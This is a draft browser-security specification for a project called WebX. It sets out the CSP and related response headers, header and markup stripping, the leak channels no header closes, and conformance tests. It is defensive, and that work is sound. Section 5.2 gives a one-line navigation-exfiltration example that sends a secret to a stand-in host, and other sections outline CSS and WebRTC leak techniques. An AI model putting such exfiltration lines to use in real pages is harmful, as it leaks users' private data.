# WebX Content Security Specification

The normative browser-security profile the WebX resolver enforces on every page it serves: the
Content-Security-Policy, the accompanying response headers, the request headers stripped on the
way out, the response headers stripped on the way in, and — just as important — the channels no
header can close and what closes them instead.

This document is the **single source of truth** for those values. Where any other document quotes
them, `scripts/check-headers.py` verifies the quotation is byte-identical and CI fails on
divergence. A profile that drifts between documents is worse than no profile: two implementers
read two different policies and both believe they conform.

The key words MUST, MUST NOT, SHALL, SHALL NOT, SHOULD, SHOULD NOT and MAY are to be interpreted
as described in RFC 2119.

**Status:** Draft — not yet implemented. Proposed formally by [WXIP-0001](WXIP-0001.md).

## 0. The governing principle

> **Entropy only matters if it can leave.**

A reader's browser is a fingerprint no header can erase. Canvas rasterisation, audio DSP paths,
font metrics and `navigator` properties are all readable, and CSP has nothing to say about any of
them. Chasing that entropy is close to unwinnable.

What *is* winnable is starving the exfiltration channel. If a page cannot make a request to
anyone but its own origin, cannot navigate away with a payload, and cannot cause the browser to
speculatively resolve a hostname, then a perfect fingerprint is worth nothing because it cannot be
delivered.

This inverts the usual priority order, and two consequences follow:

1. Effort goes to **egress closure** first and fingerprint reduction second.
2. **Any** relaxation that restores an outbound channel — a cross-name subresource allowance, a
   clearnet passthrough, a partially proxied browser — instantly revalues every unfixable
   fingerprinting vector from harmless to critical. That is why the refusals in this document are
   not tunable.

A second principle governs the values WebX does control:

> **Uniform beats random.** A spoofed value helps only if every install emits the same one. A
> per-user "randomise my fingerprint" toggle *shrinks* the anonymity set by making its user
> unique. WebX therefore pins shared constants — one User-Agent, one window size, `TZ=UTC`, one
> `Accept-Language` — and offers no randomisation setting at all.

## 1. The insecure-context reality

**WebX pages are served from origins like `http://example.webx`, which are not secure contexts.**
Loopback is treated as potentially trustworthy, but the *origin the browser derives* is the WebX
name over plain HTTP, and that is not.

This is the single most consequential fact about this profile, it cuts both ways, and every
implementer must understand it before reading anything below.

**What is INERT and MUST NOT be relied upon:**

| Header | Reality on an insecure origin |
|---|---|
| `Cross-Origin-Opener-Policy` | Ignored. `window.name` therefore **survives cross-name navigation** and is a live cross-origin correlation channel. |
| `Cross-Origin-Embedder-Policy` | Ignored. No cross-origin isolation — which is incidentally desirable here, since isolation would grant `SharedArrayBuffer` and high-resolution timers, sharpening timing attacks. |
| `Origin-Agent-Cluster` | Ignored. |
| `Clear-Site-Data` | **Ignored on insecure origins.** Any design that relies on it to clear storage is relying on nothing. |

These headers are still sent, because they cost nothing and become active if WebX ever gains a
secure-context scheme. They MUST NOT appear in any claim about what the profile currently
guarantees.

**What the insecure context protects for free:**

- **Service workers cannot register at all.** The largest persistence and background-exfiltration
  surface in the platform is structurally unavailable.
- `navigator.mediaDevices` is `undefined`, closing device enumeration.
- `queryLocalFonts`, `getScreenDetails`, WebUSB, WebHID, Web Serial, Web Bluetooth, geolocation
  and the storage-access API are all secure-context gated and therefore unavailable.

This accidental protection is load-bearing. It follows that **WebX MUST NOT register a custom
scheme as trustworthy, MUST NOT ship a browser policy that adds WebX origins to a
treat-as-secure allowlist, and MUST NOT serve WebX names over HTTPS from the local proxy.** Doing
any of those would re-enable service workers and the whole secure-context API surface in a single
step. Article 4's no-chokepoint invariant is not the only invariant worth writing down.

Because `Clear-Site-Data` is inert, storage clearing is achieved the only way it can be: an
**ephemeral browser profile directory**, created per session and destroyed after. See
[PRIVACY.md](PRIVACY.md).

## 2. Content-Security-Policy

The resolver SHALL inject this header on every response it serves, **replacing** any policy the
site supplied. A site-supplied CSP is discarded rather than merged, because merging two policies
is a well-known source of accidental widening. It is injected on non-HTML responses too, so that
a worker or worklet script inherits it.

<!-- canonical:content-security-policy -->
```text
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; media-src 'self'; connect-src 'self'; manifest-src 'self'; worker-src 'none'; child-src 'none'; frame-src 'none'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'none'; webrtc 'block'; require-trusted-types-for 'script'; trusted-types 'none'
```

### 2.1 Directive rationale

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | Fail closed. A resource type nobody remembered to enumerate — including types added to the platform after this was written — inherits a denial, not a permission. |
| `script-src` | `'self'` | No `'unsafe-inline'`, no `'unsafe-eval'`, and deliberately no `'wasm-unsafe-eval'`. Also governs worklet `addModule()` and `type="speculationrules"` blocks. |
| `style-src` | `'self'` | No `'unsafe-inline'`. Inline CSS is a working exfiltration channel — an attribute selector plus a `url()` leaks document content character by character — and is the relaxation that most often drags script injection back through `style` attributes. |
| `img-src` | `'self'` | Not `data:`. Attacker-controlled bytes rendered without a fetch, for no benefit: every asset is already inside the page's own CID. |
| `font-src` | `'self'` | Closes `@font-face` and the `unicode-range` probe. |
| `media-src` | `'self'` | Covers `video`, `audio`, `source` and `track`. `blob:` excluded — a blob can be built from data obtained elsewhere. |
| `connect-src` | `'self'` | `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`, `fetchLater`, WebTransport and the anchor `ping` attribute. The most important directive here. |
| `manifest-src` | `'self'` | Manifest icons then fall to `img-src`. |
| `worker-src` | `'none'` | **Not `'self'`.** `worker-src` gates `serviceWorker.register()` as well as `Worker` and `SharedWorker`. `'self'` would permit registration — and with it Cache Storage, Background Sync and Push, none of which has a Permissions-Policy token. Service workers are already unavailable per section 1; this makes the denial explicit rather than dependent on that. |
| `child-src` | `'none'` | Fallback for nested contexts in older engines. |
| `frame-src` | `'none'` | No iframes. Note `about:blank` and `srcdoc` frames are exempt from this directive in shipping browsers, but they inherit the parent's policy, so nothing escapes. |
| `object-src` | `'none'` | Legacy execution surface, no legitimate use. |
| `frame-ancestors` | `'none'` | Removes clickjacking and cross-origin framing side channels. |
| `form-action` | `'self'` | **Not `'none'`.** `'none'` breaks any WebX site with a search box while closing nothing extra — third-party form exfiltration is already blocked by restricting the value to `'self'`. Enforced across redirects. |
| `base-uri` | `'none'` | Stops an injected `<base>` re-pointing every relative URL. |
| `webrtc` | `'block'` | CSP Level 3. Blocks `RTCPeerConnection` construction. **Chromium-only at present** — see section 5.1, this is a partial control, not a solved problem. |
| `require-trusted-types-for` | `'script'` | Closes DOM-XSS sinks at the platform level rather than by code review. |
| `trusted-types` | `'none'` | No policy may be created, so the sinks are unreachable rather than merely guarded. Cost and relaxation in 2.3. |

### 2.2 Directives deliberately absent

- **`upgrade-insecure-requests`** — meaningless over loopback HTTP, and would break same-origin
  subresources.
- **`block-all-mixed-content`** — deprecated, subsumed by `'self'`-only sources.
- **`report-uri` / `report-to`** — refused on principle. A reporting endpoint is an outbound
  channel that fires precisely when something unexpected happens, making it both a leak and an
  oracle. A *local* report endpoint is no better: it would become a durable log of every URL any
  page attempted, which is exactly the artefact [PRIVACY.md](PRIVACY.md) exists to prevent.
- **`sandbox`** — considered and rejected, but not for the obvious reason. Omitting
  `allow-top-navigation` is the *only* CSP lever over navigation exfiltration (section 5.2), which
  is a real argument for it. It is rejected because it would also block ordinary user-clicked
  links between WebX names, breaking the web-like behaviour the project exists to preserve, and
  because the full-proxy requirement closes the same channel without that cost. If the full-proxy
  requirement is ever relaxed, `sandbox` MUST be reconsidered in the same change.

### 2.3 What this breaks, and the two relaxations

| Breaks | Relaxation |
|---|---|
| Inline `<style>`, `style=` attributes | None. Move to a stylesheet in the same CID. |
| Inline `<script>`, event-handler attributes | None. Move to a script file in the same CID. |
| WebAssembly | Per-site `webx-wasm` declaration adds `'wasm-unsafe-eval'` **for that site only**, surfaced in the UI. |
| Frameworks writing HTML strings to the DOM | Per-site named Trusted Types policy, same scoping and disclosure. |
| `data:` images, inline SVG sprites | None. Must become files. |
| Web Workers | None in v1. `worker-src 'none'` is absolute; revisit only by WXIP. |

Every relaxation is **per-site, never global**, and **visible to the reader**. A widening the
reader cannot see is a widening that will be abused. No configuration file, control-API setting or
command-line flag may apply either relaxation globally, and that refusal is not tunable.

## 3. Accompanying response headers

<!-- canonical:permissions-policy -->
```text
Permissions-Policy: accelerometer=(), ambient-light-sensor=(), attribution-reporting=(), autoplay=(), battery=(), bluetooth=(), browsing-topics=(), camera=(), compute-pressure=(), display-capture=(), encrypted-media=(), fullscreen=(), gamepad=(), geolocation=(), gyroscope=(), hid=(), identity-credentials-get=(), idle-detection=(), join-ad-interest-group=(), language-detector=(), local-fonts=(), magnetometer=(), microphone=(), midi=(), otp-credentials=(), payment=(), picture-in-picture=(), private-state-token-issuance=(), private-state-token-redemption=(), publickey-credentials-create=(), publickey-credentials-get=(), run-ad-auction=(), screen-wake-lock=(), serial=(), shared-storage=(), shared-storage-select-url=(), speaker-selection=(), storage-access=(), summarizer=(), translator=(), usb=(), web-share=(), window-management=(), xr-spatial-tracking=()
```

Every feature carries the **empty allowlist**, denying it to the document and every nested
context. The list is a literal enumeration rather than a description, because "deny every powerful
feature" is not something an implementation can execute or a test can check.

Four groups deserve note:

- **Privacy Sandbox / ad-tech** — `attribution-reporting`, `browsing-topics`,
  `join-ad-interest-group`, `run-ad-auction`, `shared-storage`, `shared-storage-select-url`,
  `private-state-token-*`. These bypass CSP entirely by design; Permissions-Policy is the only
  lever over them.
- **On-device model APIs** — `translator`, `summarizer`, `language-detector`. Newer, and each is
  a potential egress or side channel.
- **`local-fonts`** — one of the highest-entropy fingerprinting surfaces available.
- **`window-management`** — closes `getScreenDetails` and `screen.isExtended`.

This list MUST be treated as a floor and reviewed against each browser release. A feature not
named here SHOULD be denied, and an omission is a defect to report. Note also that **no
Permissions-Policy token exists** for notifications, push, clipboard, canvas, WebGL, Web Audio or
the Network Information API — those are covered, where they can be, in section 5.

<!-- canonical:referrer-policy -->
```text
Referrer-Policy: no-referrer
```

No referrer in any direction, including same-origin, so a page cannot learn which page linked to
it even within one site. Note that `<meta name="referrer" content="unsafe-url">` **overrides this
header per specification**, so the resolver MUST also strip `Referer` on the request side rather
than trusting the policy alone. Defence in depth here is not optional; it is correctness.

| Header | Value | Purpose |
|---|---|---|
| `X-Content-Type-Options` | `nosniff` | No MIME sniffing; a misdeclared type is an error, not a guess. |
| `X-Frame-Options` | `DENY` | Redundant beside `frame-ancestors 'none'` on modern engines; retained for older ones. |
| `X-DNS-Prefetch-Control` | `off` | Speculative DNS is **not covered by CSP**. Without this, `<link rel="dns-prefetch">` produces a clearnet DNS query — exactly the leak WebX exists to prevent. Note it does not stop `preconnect`'s TCP handshake in all versions; section 4.3 strips the markup as well. |
| `Cache-Control` | `no-store` | No durable browser-side copy. This forfeits the offline benefit of content addressing — a genuine trade, made deliberately in favour of leaving no trail, with the resolver's in-memory cache preserving speed within a session. |
| `Cross-Origin-Opener-Policy` | `same-origin` | **Inert today** (section 1). Sent for the future. |
| `Cross-Origin-Embedder-Policy` | `require-corp` | **Inert today.** Its inertness is fortunate: activation would grant `SharedArrayBuffer` and high-resolution timers. |
| `Cross-Origin-Resource-Policy` | `same-origin` | Active regardless of secure context. Blocks cross-origin size and timing probes against WebX content. |
| `Origin-Agent-Cluster` | `?1` | **Inert today.** Sent for the future. |

## 4. Header and markup hygiene at the proxy

### 4.1 Request headers the resolver MUST NOT emit

The rule is not "strip identifying headers" but the stronger, testable property:

> **Every install emits a byte-identical outbound request header set.**

Never forwarded or generated: `Referer`, `Cookie`, `Authorization`, `Sec-CH-UA` and every other
Client Hint (`-Mobile`, `-Platform`, `-Platform-Version`, `-Arch`, `-Bitness`, `-Model`,
`-Full-Version`, `-Full-Version-List`, `-WoW64`, `-Form-Factors`, `-Prefers-*`), `Downlink`,
`ECT`, `RTT`, `Save-Data`, `DNT`, `Sec-GPC`, `X-Forwarded-For`, `X-Real-IP`, `Via`, `Forwarded`,
and anything carrying an install identifier, resolver version, build hash or platform string.

Pinned to shared constants: `User-Agent` (one fixed, version-free value for every install),
`Accept-Language` (`en`, regardless of system locale).

### 4.2 Response headers the resolver MUST strip

`Set-Cookie`, `Set-Cookie2`; any `Content-Security-Policy` or
`Content-Security-Policy-Report-Only` the content supplied; `Report-To`, `Reporting-Endpoints`,
`NEL`; `Server-Timing`; `Link` (carries `preconnect`, `preload` and `dns-prefetch` relationships
that bypass CSP); `Refresh`; `Alt-Svc`; `Accept-CH` and `Critical-CH`; `Strict-Transport-Security`;
`Public-Key-Pins`; `Access-Control-Allow-*`; `Timing-Allow-Origin`; `Server`.

### 4.3 Markup the resolver MUST neutralise

Not covered by CSP, and therefore removed before serving:

- `<link>` with `rel` of `dns-prefetch`, `preconnect`, `prefetch`, `prerender` or `modulepreload`
  where the href is not same-origin.
- `<script type="speculationrules">` blocks and any `Speculation-Rules` header.
- `<meta http-equiv="refresh">` with a non-same-origin target.
- `<meta name="referrer">` in any form — it overrides the header per specification.
- The `ping` attribute on anchors. Covered by `connect-src` in current engines; removed anyway so
  that coverage is not a dependency.

Rewriting markup conflicts with byte-exact CID verification. The resolver MUST therefore verify
the content hash **before** neutralisation, serve the modified bytes, and expose the original
verified hash through the control API so the reader can confirm what was fetched.

## 5. What no header can close

A security document that lists only its wins is a marketing document.

**5.1 WebRTC.** `webrtc 'block'` is Chromium-only. Where unsupported, a page that can run script
can open a peer connection and learn the reader's real IP through ICE gathering. WebRTC uses raw
UDP and **ignores the HTTP proxy entirely**, so full-proxy mode does not contain it either.

*Control:* the WebX desktop client MUST ship with WebRTC compiled out or disabled in its webview.
For a third-party browser the resolver cannot enforce it, and the client MUST warn plainly rather
than imply protection it does not have. This is the most serious residual in the browser layer.

**5.2 Top-level navigation.** `navigate-to` never shipped; `form-action` covers only forms.
`location = 'https://example.invalid/?' + secret` works.

*Control:* full-proxy configuration, so the navigation becomes a request the resolver refuses with
`1403 EGRESS_REFUSED`. This is why Private Mode requires whole-browser proxying rather than an
extension — an extension cannot guarantee it sees every navigation, and a partially proxied
browser is a browser with a hole in it.

**5.3 The PAC file.** The proxy auto-config that routes the browser is itself a leak surface. It
MUST match on strings only — `dnsDomainIs`, `shExpMatch`, host-suffix comparison — and MUST NOT
call `dnsResolve`, `isResolvable`, `isInNet` or `myIpAddress`, every one of which performs a DNS
lookup or network probe while deciding how to route. It MUST NOT contain a `DIRECT` fallback for
WebX names.

**5.4 Fingerprinting the platform cannot gate.** Canvas, WebGL, Web Audio DSP, font metrics via
`getBoundingClientRect`, `navigator` core properties, `devicePixelRatio`, `colorDepth`, the CSS
media-feature set, timezone and ICU version. No CSP directive and no Permissions-Policy token
exists for any of them.

*Control:* client-side only — a fixed launch window size, `TZ=UTC` in the client environment,
WebGL and Web Audio disabled in the client's webview. And, per section 0, these matter only if
egress is open; the primary defence is that the fingerprint has nowhere to go.

**5.5 The browser's own behaviour.** Omnibox search suggestions, Safe Browsing lookups,
translation offers, update checks and **extensions** — every one is a clearnet request the
resolver never sees, and an extension can read every WebX page with CSP and proxy both intact.

*Control:* Private Mode requires the client's own webview or a locked browser profile with
telemetry, suggestions and extensions disabled. With a third-party browser this cannot be
enforced, and the client MUST say so.

**5.6 Network-layer correlation.** DHT and bitswap traffic reveal which blocks a reader wants. A
pinning service that is the sole provider of a site sees every one of its readers.

*Control:* rotate the PeerID per session and per Private Mode launch; prefer locally pinned blocks
and already-connected peers; fetch and verify the **entire site DAG atomically** on first request
and serve every subsequent path from that snapshot, so that path-level block selection cannot be
used as an exfiltration oracle. Volume and timing still correlate, and that is not closable.

**5.7 Same-origin timing.** Which page of a site a reader opened. Not closable, and not claimed.

**5.8 A compromised endpoint.** Complete and irreducible.

## 6. Conformance

Each is an executable test asserting on **observed behaviour**, not configuration:

1. The three canonical values in sections 2 and 3 are emitted byte-identically on every response.
2. A site-supplied CSP is discarded, never merged.
3. **Zero-egress:** load a page containing one of every construct in section 4.3 under a socket
   monitor; the observed connection set contains only WebX peers. Any other socket fails the
   build.
4. Two installs on different machines emit byte-identical outbound request headers.
5. Every relaxation in 2.3 is per-site and surfaced in the UI.
6. `serviceWorker.register()` rejects.
7. The PAC file contains none of the forbidden functions (static check).
8. The whole-DAG snapshot is fetched before any path is served.

Test 3 is the one that matters. Constitution Article 14 requires exactly this form of test, and
Article 44.8 places it in the same conformance run as the wire vectors, so a rights guarantee and
a correctness guarantee fail the same build.

## See also

- [Privacy and zero-trail specification](PRIVACY.md)
- [Resolution specification](RESOLUTION.md)
- [WXIP-0001](WXIP-0001.md)
- [Threat model](../THREAT-MODEL.md)
- [The WebX Constitution](../../constitution/CONSTITUTION.md) — Articles 13, 14, 24
